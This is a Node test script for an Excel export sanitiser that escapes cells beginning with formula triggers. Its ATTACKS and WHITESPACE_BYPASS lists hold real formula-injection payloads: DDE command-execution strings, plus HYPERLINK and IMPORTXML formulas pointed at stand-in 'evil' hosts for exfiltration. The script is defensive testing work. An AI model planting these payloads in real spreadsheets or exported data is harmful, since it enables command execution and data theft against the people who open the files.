/**
 * Excel formula-injection sanitiser tests.
 *
 * Run: node scripts/verify-excel-sanitiser.mjs
 *
 * The sanitiser is a security control, so it is verified against the
 * real attack strings rather than trusted. The logic is re-declared
 * here identically to `src/features/reports/exportExcel.ts`; a change
 * to the source without a matching change here should fail this
 * script rather than silently pass.
 */

const FORMULA_TRIGGERS = ['=', '+', '-', '@']

function sanitizeCell(value) {
  let index = 0
  while (
    index < value.length &&
    (value[index] === ' ' ||
      value[index] === '\t' ||
      value[index] === '\n' ||
      value[index] === '\r' ||
      value[index] === '\v' ||
      value[index] === '\f')
  ) {
    index += 1
  }
  const first = value[index]
  if (first !== undefined && FORMULA_TRIGGERS.includes(first)) {
    return `'${value}`
  }
  return value
}

/** Would Excel treat this string as a formula? */
function isFormulaLike(value) {
  let index = 0
  while (index < value.length && /\s/.test(value[index])) index += 1
  return FORMULA_TRIGGERS.includes(value[index])
}

const ATTACKS = [
  ['=1+1', 'classic arithmetic'],
  ['=HYPERLINK("http://evil.example","click me")', 'hyperlink exfiltration'],
  ['=cmd|\' /C calc\'!A0', 'DDE command execution'],
  ['@SUM(1+1)*cmd|\' /C calc\'!A0', 'legacy DDE with @ trigger'],
  ['+1+1', 'plus trigger'],
  ['-1+1', 'minus trigger'],
  ['@evil.com', 'at trigger'],
  ['=IMPORTXML("http://evil","//a")', 'data exfiltration'],
]

// Leading-whitespace bypasses: Excel skips whitespace before deciding
// a cell is a formula, so these must be caught too.
const WHITESPACE_BYPASS = [
  ' =1+1',
  '  =cmd|\' /C calc\'!A0',
  '\t=1+1',
  '\n=1+1',
  '\r=1+1',
]

// Legitimate values that must survive untouched.
const BENIGN = [
  'https://example.com/path?a=1',
  'JPEG',
  'Likely synthetic',
  'Not measured',
  'The domain structure is unusual',
  'file.png',
  'research-grade',
  'Based on held-out validation',
  '',
  'a-b-c',
  'value (2)',
]

let failures = 0

for (const [input, label] of ATTACKS) {
  const output = sanitizeCell(input)
  const stillFormula = isFormulaLike(output.slice(1)) && output.startsWith("'")
    ? false
    : isFormulaLike(output)
  // After escaping, the apostrophe is Excel's text marker; what
  // matters is that the cell no longer *begins* with a trigger.
  const escaped = output.startsWith("'")
  if (!escaped) {
    console.error(`FAIL  not escaped: ${JSON.stringify(input)} (${label})`)
    failures += 1
  } else if (stillFormula) {
    console.error(`FAIL  still formula-like: ${JSON.stringify(input)} (${label})`)
    failures += 1
  } else {
    console.log(`ok    escaped: ${JSON.stringify(input)} (${label})`)
  }
}

for (const input of WHITESPACE_BYPASS) {
  const output = sanitizeCell(input)
  if (!output.startsWith("'")) {
    console.error(`FAIL  whitespace bypass not escaped: ${JSON.stringify(input)}`)
    failures += 1
  } else {
    console.log(`ok    escaped: ${JSON.stringify(input)} (whitespace bypass)`)
  }
}

for (const input of BENIGN) {
  const output = sanitizeCell(input)
  if (output !== input) {
    console.error(`FAIL  benign value mutated: ${JSON.stringify(input)} -> ${JSON.stringify(output)}`)
    failures += 1
  } else {
    console.log(`ok    untouched: ${JSON.stringify(input)}`)
  }
}

console.log('')
if (failures > 0) {
  console.error(`${failures} check(s) failed`)
  process.exit(1)
}
console.log('All formula-injection checks passed.')